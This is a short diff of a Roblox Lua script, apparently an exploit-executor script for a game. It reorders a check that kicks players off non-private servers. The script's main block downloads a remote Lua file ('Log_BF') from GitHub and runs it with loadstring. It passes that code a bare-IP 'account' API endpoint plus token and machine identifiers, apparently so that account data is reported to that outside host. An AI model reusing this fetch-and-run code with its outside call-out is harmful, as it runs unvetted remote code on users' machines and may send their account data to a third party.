@@ -1,11 +1,3 @@
-local Private_Server = game:GetService('RobloxReplicatedStorage').GetServerType:InvokeServer()
-task.spawn(function()
-    if Private_Server == "StandardServer" then
-        game:GetService("Players").LocalPlayer:Kick("Private Server Not Detected");
-        task.wait(3)
-        game:Shutdown()
-    end
-end)
 
 task.spawn(function()
 repeat task.wait() until game:IsLoaded()
@@ -13,4 +5,13 @@ __script__host = "http://45.136.254.74/api/account"
 __script__token = "PC-1"
 __script__machine = "PC-18"
 loadstring(game:HttpGet'https://raw.githubusercontent.com/ooboor005/Log_BF/main/Log_BF.lua'){__script__host, __script__token, __script__machine}
+end)
+
+local Private_Server = game:GetService('RobloxReplicatedStorage').GetServerType:InvokeServer()
+task.spawn(function()
+    if Private_Server == "StandardServer" then
+        game:GetService("Players").LocalPlayer:Kick("Private Server Not Detected");
+        task.wait(3)
+        game:Shutdown()
+    end
 end)
